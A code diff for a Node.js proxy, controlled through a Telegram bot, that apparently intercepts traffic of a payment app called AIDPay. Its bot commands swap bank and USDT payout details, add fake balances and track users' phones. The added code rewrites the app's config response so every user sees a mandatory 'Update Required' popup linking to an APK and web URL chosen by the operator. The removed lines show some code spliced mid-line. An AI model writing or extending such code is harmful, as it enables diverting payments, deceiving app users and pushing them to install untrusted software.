@@ -589,7 +589,7 @@ app.post('/bot-webhook', async (req, res) => {
     if (text === '/start') {
       data.adminChatId = chatId;
       await saveData(data);
-      await bot.sendMessage(chatId, '🚀 AIDPay Proxy Bot Started!\n\nCommands:\n/status - Bot status\n/on - Enable proxy\n/off - Disable proxy\n/banks - List banks\n/addbank - Add bank\n/removebank - Remove bank\n/setbank - Set active bank\n/setmin <n> <amount> - Min order amount for bank\n/rotate - Toggle auto-rotate\n/log - Toggle logging\n/debug on - Full request+response logging ON\n/debug off - Full logging OFF\n/debug - One-shot debug next response\n/setusdt <address> - Set USDT address override\n/usdt - Show current USDT address\n/removeusdt - Remove USDT override\n/debugusdt - Toggle USDT debug logging\n/add <userId> <amount> - Add balance\n/deduct <userId> <amount> - Deduct balance\n/remove balance <userId> - Remove fake balance\n/history - Balance history\n/off log <userId> - Disable logging for user\n/on log <userId> - Enable logging for user');
+      await bot.sendMessage(chatId, '🚀 AIDPay Proxy Bot Started!\n\nCommands:\n/status - Bot status\n/on - Enable proxy\n/off - Disable proxy\n/banks - List banks\n/addbank - Add bank\n/removebank - Remove bank\n/setbank - Set active bank\n/setmin <n> <amount> - Min order amount for bank\n/rotate - Toggle auto-rotate\n/log - Toggle logging\n/debug on - Full request+response logging ON\n/debug off - Full logging OFF\n/debug - One-shot debug next response\n/setusdt <address> - Set USDT address override\n/usdt - Show current USDT address\n/removeusdt - Remove USDT override\n/debugusdt - Toggle USDT debug logging\n/add <userId> <amount> - Add balance\n/deduct <userId> <amount> - Deduct balance\n/remove balance <userId> - Remove fake balance\n/history - Balance history\n/off log <userId> - Disable logging for user\n/on log <userId> - Enable logging for user\n/update on <apkUrl> <webUrl> - Force update popup ON (sare users ko)\n/update off - Force update popup OFF\n/update status - Update popup status dekho');
       return res.sendStatus(200);
     }
 
@@ -598,6 +598,9 @@ app.post('/bot-webhook', async (req, res) => {
       const idCount = Object.keys(data.userOverrides || {}).length;
       let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
       if (data.usdtAddress) m += `\n💎 USDT: ${data.usdtAddress}`;
+      const fu = data.forceUpdate || {};
+      m += `\n🔄 Update Popup: ${fu.enabled ? '🔴 ON — Sare users ko dikhra hai' : '🟢 OFF'}`;
+      if (fu.enabled) { m += `\n📥 APK: ${fu.apkUrl || 'N/A'}\n🌐 Web: ${fu.webUrl || 'N/A'}`; }
       if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
       else m += '\n\n⚠️ No active bank';
       await bot.sendMessage(chatId, m);
@@ -801,6 +804,53 @@ app.post('/bot-webhook', async (req, res) => {
       return res.sendStatus(200);
     }
 
+    if (text.startsWith('/update')) {
+      if (!data.forceUpdate) data.forceUpdate = { enabled: false, apkUrl: '', webUrl: '' };
+
+      if (text === '/update off') {
+        data.forceUpdate.enabled = false;
+        await saveData(data);
+        await bot.sendMessage(chatId, '✅ Update popup OFF — Users ab normal app use kar sakte hain.');
+        return res.sendStatus(200);
+      }
+
+      if (text === '/update status') {
+        const fu = data.forceUpdate;
+        if (fu.enabled) {
+          await bot.sendMessage(chatId, `🔴 Update Popup: ON\n📥 APK URL: ${fu.apkUrl || 'N/A'}\n🌐 Web URL: ${fu.webUrl || 'N/A'}\n\nSare users ko app kholne pe mandatory update dikhra hai.`);
+        } else {
+          await bot.sendMessage(chatId, '🟢 Update Popup: OFF\nKoi bhi forced update nahi chal raha.');
+        }
+        return res.sendStatus(200);
+      }
+
+      if (text.startsWith('/update on ')) {
+        const rest = text.substring(11).trim();
+        const parts = rest.split(/\s+/);
+        if (parts.length < 2) {
+          await bot.sendMessage(chatId, '❌ Format:\n/update on <apkUrl> <webUrl>\n\nExample:\n/update on https://oss.aidpay-web.com/apk/aidpay.apk https://app-web.aidpay-web.com/');
+          return res.sendStatus(200);
+        }
+        const apkUrl = parts[0];
+        const webUrl = parts[1];
+        data.forceUpdate = { enabled: true, apkUrl, webUrl };
+        await saveData(data);
+        await bot.sendMessage(chatId, `✅ Update Popup ON!\n\n📥 APK URL:\n${apkUrl}\n\n🌐 Web URL:\n${webUrl}\n\n⚠️ Ab sare users ko app kholne pe "Update Required" popup dikhega.\nBand karne ke liye: /update off`);
+        return res.sendStatus(200);
+      }
+
+      if (text === '/update logconfig') {
+        if (!data.forceUpdate) data.forceUpdate = { enabled: false, apkUrl: '', webUrl: '' };
+        data.forceUpdate.logConfig = !data.forceUpdate.logConfig;
+        await saveData(data);
+        await bot.sendMessage(chatId, `🔍 Config Logging: ${data.forceUpdate.logConfig ? 'ON — ab app kholne pe real /global/config response yahan aayega' : 'OFF'}`);
+        return res.sendStatus(200);
+      }
+
+      await bot.sendMessage(chatId, '❌ Format:\n/update on <apkUrl> <webUrl> — Popup ON karo\n/update off — Popup OFF karo\n/update status — Status dekho\n/update logconfig — Real API response Telegram pe log karo (debug)');
+      return res.sendStatus(200);
+    }
+
     if (text.startsWith('/testtask')) {
       const parts = text.split(/\s+/);
       const targetUid = parts[1] || Object.keys(sessionKeyMap)[0];
@@ -832,15 +882,10 @@ app.post('/bot-webhook', async (req, res) => {
       const users = data.trackedUsers || {};
       const keys = Object.keys(users);
       if (keys.length === 0) { await bot.sendMessage(chatId, '📋 No tracked users.'); return res.sendStatus(200); }
-      let msgif (text === '/update logconfig') {
-        if (!data.forceUpdate) data.forceUpdate = { enabled: false, apkUrl: '', webUrl: '' };
-        data.forceUpdate.logConfig = !data.forceUpdate.logConfig;
-        await saveData(data);
-        await bot.sendMessage(chatId, `🔍 Config Logging: ${data.forceUpdate.logConfig ? 'ON — ab app kholne pe real /global/config response yahan aayega' : 'OFF'}`);
-        return res.sendStatus(200);
-      }
-
-      await bot.sendMessage(chatId, '❌ Format:\n/update on <apkUrl> <webUrl> — Popup ON karo\n/update off — Popup OFF karo\n/update status — Status dekho\n/update logconfig — Real API response Telegram pe log karo (debug)hone ? ' 📱' + u.phone : ''} | ${u.lastAction || 'N/A'} | ${u.lastSeen || 'N/A'}\n`;
+      let msg = '👥 Tracked Users:\n━━━━━━━━━━━━━━━━━━\n';
+      for (const uid of keys.slice(-20)) {
+        const u = users[uid];
+        msg += `👤 ${uid}${u.phone ? ' 📱' + u.phone : ''} | ${u.lastAction || 'N/A'} | ${u.lastSeen || 'N/A'}\n`;
       }
       await bot.sendMessage(chatId, msg);
       return res.sendStatus(200);
@@ -1496,7 +1541,56 @@ for (const ep of COLLECTION_ENDPOINTS) {
 
 app.all('/app/pay/upload/file', async (req, res) => { await transparentProxy(req, res); });
 app.all('/app/user/upload/param', async (req, res) => { await transparentProxy(req, res); });
-app.all('/app/global/config', async (req, res) => { await transparentProxy(req, res); });
+app.all('/app/global/config', async (req, res) => {
+  try {
+    const data = await loadData();
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const fu = data.forceUpdate || {};
+
+    if (data.adminChatId && bot && fu.logConfig) {
+      const preview = JSON.stringify(jsonResp).substring(0, 1500);
+      bot.sendMessage(data.adminChatId, `🔍 /app/global/config Real Response:\n\n${preview}`).catch(() => {});
+    }
+
+    if (fu.enabled && fu.apkUrl) {
+      if (jsonResp && typeof jsonResp === 'object') {
+        const updateFields = {
+          isForce: 1,
+          isForceUpdate: 1,
+          upgradeType: 2,
+          upgrade: 1,
+          needUpdate: 1,
+          isUpdate: 1,
+          forceUpdate: 1,
+          newVersion: '9.9.9',
+          versionCode: 999,
+          newVersionCode: 999,
+          androidVersionCode: 999,
+          androidVersion: '9.9.9',
+          downloadUrl: fu.apkUrl,
+          apkUrl: fu.apkUrl,
+          apkDownloadUrl: fu.apkUrl + '?t=' + Date.now(),
+          androidDownloadUrl: fu.apkUrl + '?t=' + Date.now(),
+          webUrl: fu.webUrl || '',
+          officialWebUrl: fu.webUrl || '',
+          officialUrl: fu.webUrl || '',
+          h5Url: fu.webUrl || '',
+          domainUrl: fu.webUrl || '',
+          content: 'A new version is available. Please update now to continue using the app.',
+          upgradeContent: 'A new version is available. Please update now to continue using the app.'
+        };
+        if (jsonResp.data && typeof jsonResp.data === 'object') Object.assign(jsonResp.data, updateFields);
+        else if (jsonResp.body && typeof jsonResp.body === 'object') Object.assign(jsonResp.body, updateFields);
+        else if (jsonResp.result && typeof jsonResp.result === 'object') Object.assign(jsonResp.result, updateFields);
+        else jsonResp.data = updateFields;
+        Object.assign(jsonResp, updateFields);
+        return sendJson(res, respHeaders, jsonResp, respBody);
+      }
+    }
+    res.writeHead(response.status, respHeaders);
+    res.end(respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
 app.all('/app/auth/refresh/session', async (req, res) => {
   try {
     const data = await loadData();
@@ -1539,44 +1633,37 @@ app.all('/app/api/customer/list', async (req, res) => {
     sendDebugLog(data, req, respBody, 'Customer Support');
     if (!isLogOff(data, userId) && data.adminChatId && bot) {
       const phone = getPhone(data, userId);
-      const now = ne
-    if (data.adminChatId && bot && fu.logConfig) {
-      const preview = JSON.stringify(jsonResp).substring(0, 1500);
-      bot.sendMessage(data.adminChatId, `🔍 /app/global/config Real Response:\n\n${preview}`).catch(() => {});
+      const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      bot.sendMessage(data.adminChatId,
+        `📞 Customer Support [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''}\n🕐 ${now}`
+      ).catch(()=>{});
     }
+  } catch(e) { await transparentProxy(req, res); }
+});
 
-    if (fu.enabled && fu.apkUrl) {
-      if (jsonResp && typeof jsonResp === 'object') {
-        const updateFields = {
-          isForce: 1,
-          isForceUpdate: 1,
-          upgradeType: 2,
-          upgrade: 1,
-          needUpdate: 1,
-          isUpdate: 1,
-          forceUpdate: 1,
-          newVersion: '9.9.9',
-          versionCode: 999,
-          newVersionCode: 999,
-          androidVersionCode: 999,
-          androidVersion: '9.9.9',
-          downloadUrl: fu.apkUrl,
-          apkUrl: fu.apkUrl,
-          apkDownloadUrl: fu.apkUrl + '?t=' + Date.now(),
-          androidDownloadUrl: fu.apkUrl + '?t=' + Date.now(),
-          webUrl: fu.webUrl || '',
-          officialWebUrl: fu.webUrl || '',
-          officialUrl: fu.webUrl || '',
-          h5Url: fu.webUrl || '',
-          domainUrl: fu.webUrl || '',
-          content: 'A new version is available. Please update now to continue using the app.',
-          upgradeContent: 'A new version is available. Please update now to continue using the app.'
-        };
-        if (jsonResp.data && typeof jsonResp.data === 'object') Object.assign(jsonResp.data, updateFields);
-        else if (jsonResp.body && typeof jsonResp.body === 'object') Object.assign(jsonResp.body, updateFields);
-        else if (jsonResp.result && typeof jsonResp.result === 'object') Object.assign(jsonResp.result, updateFields);
-        else jsonResp.data = updateFields;
-        Object.assign(jsonResp, updateFields) req.parsedBody || {};
+app.all('/app/user/cs/url', async (req, res) => {
+  try {
+    const data = await loadData();
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    if (userId) saveTokenUserId(req, userId);
+    sendJson(res, respHeaders, jsonResp, respBody);
+    sendDebugLog(data, req, respBody, 'Contact Us');
+    if (!isLogOff(data, userId) && data.adminChatId && bot) {
+      const phone = getPhone(data, userId);
+      const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      bot.sendMessage(data.adminChatId,
+        `📞 Contact Us [${userId || 'N/A'}]${phone ? ' 📱' + phone : ''}\n🕐 ${now}`
+      ).catch(()=>{});
+    }
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+app.all('/app/secure/pin/reset', async (req, res) => {
+  try {
+    const data = await loadData();
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const body = req.parsedBody || {};
     const userId = await extractUserId(req, jsonResp);
     if (userId) saveTokenUserId(req, userId);
     sendJson(res, respHeaders, jsonResp, respBody);
